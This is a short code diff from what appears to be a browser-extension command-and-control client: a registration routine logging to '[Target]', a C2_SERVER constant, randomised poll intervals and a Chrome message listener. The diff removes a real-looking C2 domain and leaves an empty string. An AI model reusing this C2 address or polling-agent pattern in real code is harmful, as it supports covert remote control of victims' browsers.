@@ -27,7 +27,7 @@ window.run = function(cfg) {
       console.error("[Target] Fetch error during registration:", err);
     });
 };
-  const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if needed
+  const C2_SERVER = ''; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -386,6 +386,7 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
   return true;
 });
 }
+
 
 
 
